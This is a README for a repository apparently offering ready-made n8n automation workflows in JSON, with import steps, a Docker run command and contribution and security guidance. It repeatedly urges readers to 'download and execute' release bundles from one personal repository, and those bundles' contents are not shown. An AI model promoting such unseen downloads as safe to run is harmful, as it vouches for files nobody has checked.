# Awesome n8n Workflows — Ready Automations for Teams & Apps

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/DoaaSaeedZaki/awesome-n8n-workflows/releases)

A curated collection of ready-to-use n8n workflows in JSON format. Download release assets and import the JSON files into n8n. Run the workflows to automate tasks across analytics, communication, CRM, e‑commerce, finance, HR, marketing, monitoring, and security.

[![n8n](https://raw.githubusercontent.com/n8n-io/n8n/master/docs/assets/images/logo/n8n-type-dark.svg)](https://n8n.io)  ![Topics](https://img.shields.io/badge/topics-automation%2Cintegration%2Cn8n%2Cproductivity-lightgrey)

Table of contents
- What this repo contains
- Why use these workflows
- Workflow categories
- Quick start (download, import, run)
- Example: CRM lead capture flow
- How files are organized
- Contribution guide
- Testing and troubleshooting
- License and credits
- Releases (download & execute)

What this repo contains
- Curated, documented n8n workflows in JSON format.
- Templates for common tasks: API sync, email routing, alerts, ETL, and scheduled jobs.
- Comments and metadata inside the JSON to explain trigger nodes, credentials, and node logic.
- Tags and labels for each workflow to help you find what you need.

Why use these workflows
- Save time. Use prebuilt flows instead of building from scratch.
- Learn patterns. Inspect node chains and credential setups.
- Standardize automations. Use common naming and metadata across workflows.
- Integrate systems. Connect CRMs, analytics, e‑commerce platforms, and monitoring tools.

Workflow categories
- Analytics: ETL, tracking, metrics push to BI tools, scheduled reporting.
- Communication: Email parsing, Slack routing, Teams notifications, SMS alerts.
- CRM: Lead capture, enrichment, contact sync, activity logging.
- E‑commerce: Order sync, inventory updates, customer notifications.
- Finance: Invoice processing, payment reconciliation, ledger updates.
- HR: Onboarding sequence, candidate notifications, calendar invites.
- Marketing: Lead scoring, campaign triggers, ad performance imports.
- Monitoring: Uptime checks, log parsing, incident ticket creation.
- Security: Alert enrichment, IP blocklists, authentication monitoring.

Quick start — download, import, run
1. Visit the Releases page and download the release ZIP or the specific JSON asset you need:
   - https://github.com/DoaaSaeedZaki/awesome-n8n-workflows/releases
2. Unzip the release or locate the JSON file for the workflow you want.
3. Open your n8n instance (cloud or self‑hosted).
4. In n8n, click "Import" and choose the JSON file you downloaded.
5. Review and set credentials in the imported workflow.
6. Activate triggers or execute the workflow manually to test.

If the release includes a single file or a set of JSON files, download and execute those files in n8n by importing them. Each release contains a README or a manifest that lists the files and the recommended order to import or run them.

Example: CRM lead capture flow (high level)
- Trigger: Webhook receives lead from a form or ad platform.
- Enrich: Call enrichment API (email, company data).
- Validate: Check for duplicates in CRM.
- Create/Update: Upsert contact and create a lead record.
- Notify: Send Slack message to sales channel.
- Log: Append event to analytics service or data warehouse.

Node map (short)
- Webhook → HTTP Request → Function (transform) → CRM (upsert) → Slack → BigQuery/CSV export

How files are organized
- /workflows
  - /analytics
    - reports-daily.json
    - etl-google-analytics.json
  - /crm
    - lead-capture-upsert.json
    - contact-sync-salesforce.json
  - /ecommerce
    - order-sync-shopify.json
  - /monitoring
    - uptime-alerts.json
  - README.md (this file)
- /assets
  - images for README and examples
- /contrib
  - contribution templates and guidelines

How metadata is stored in each JSON
- name: the workflow name
- tags: searchable topic tags like crm, marketing, zapier, shopify
- description: one-line summary of the flow
- nodes: the n8n nodes and their settings
- credentials: placeholders for the credential types you must provide
- runOrder: suggested sequence for imports if workflows depend on each other

Credentials and secrets
- Remove real secrets from imported workflows before you commit them.
- Replace placeholder credential entries with your own credentials in n8n.
- Only grant least-privilege API keys where applicable.
- Use n8n credentials store for secure handling.

Local development and testing
- Run n8n locally with Docker:
  - docker run -it --rm \
    -p 5678:5678 \
    -v ~/.n8n:/home/node/.n8n \
    n8nio/n8n
- Import a JSON file in the UI.
- Use the execution log to inspect node output and errors.
- Use the "Execute Node" feature to test a node in isolation.

Example import command (n8n CLI)
- Use the n8n CLI to import JSON workflows programmatically:
  - n8n import:workflow --input=/path/to/lead-capture-upsert.json
- After import, use credentials command to set required keys.

Contribute
- Fork the repo.
- Add your workflow JSON under the correct category folder.
- Include a short README in the workflow folder:
  - Purpose
  - Trigger type
  - Required credentials
  - Node list
  - Runtime notes
- Open a pull request with a clear title and description.
- Use the PR template to list tests you ran and any external APIs you used.
- Tag maintainers or use GitHub Discussions if you need design feedback.

Testing checklist for contributions
- The workflow imports into n8n without JSON errors.
- The workflow contains no real credentials.
- Each credential type is documented in the workflow README.
- Nodes include comments or a Function node with inline descriptions when logic is non‑trivial.
- The workflow uses descriptive node names and labels.

Security practices
- Avoid embedding API keys or passwords in JSON files.
- Use environment variables for sensitive values in self‑hosted n8n.
- Lock down webhooks with a secret or token.
- Rotate credentials regularly.
- Review third‑party nodes and API calls before production use.

Search and discovery
- Use the repository topics to find workflows:
  - automation, integration, n8n, productivity, workflow
- Use the search bar in GitHub with tags or keywords like "shopify", "slack", or "lead".

Releases — download and execute
- The releases page contains curated bundles and single-workflow assets.
- Download the JSON files from a release and import them into n8n. Each release includes a manifest that lists steps and dependencies.
- Releases link:
  - https://github.com/DoaaSaeedZaki/awesome-n8n-workflows/releases
- Use the badge near the top of this README to jump to the latest release.

Common troubleshooting
- Import failed: Check JSON syntax and confirm you downloaded the full file.
- Missing credentials: Open the workflow settings and set credentials for each credential-type node.
- Credential mismatch: Replace placeholder credentials with correct credential names from your n8n instance.
- Node error: Inspect the node execution log and adjust input data types or headers used in HTTP calls.
- Webhook not firing: Confirm external system targets the correct public URL and port. Use tunneling (ngrok) in dev environments.

Sample workflow preview image
![Workflow Example](https://raw.githubusercontent.com/n8n-io/n8n/master/docs/assets/images/workflows/example-workflow.png)

Badges and status
- [![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
- [![Release](https://img.shields.io/github/v/release/DoaaSaeedZaki/awesome-n8n-workflows?style=flat-square)](https://github.com/DoaaSaeedZaki/awesome-n8n-workflows/releases)
- Use the releases link above to download artifacts and import them into n8n.

License
- This repository uses the MIT license. See LICENSE for full terms.

Credits and sources
- n8n project (n8n.io) — workflow engine and community.
- Contributors who submit workflows and templates.
- Public APIs referenced by the workflows (listed per-workflow in each folder).

Contact and support
- Open issues for bugs or feature requests.
- Use pull requests for new workflows or fixes.
- Use Discussions for design or architecture questions.

Topics
- automation, integration, n8n, productivity, workflow

Follow the Releases link to download the workflow files and execute them in your n8n instance:
- https://github.com/DoaaSaeedZaki/awesome-n8n-workflows/releases

Enjoy the automations and share improvements by contributing new workflows or updates.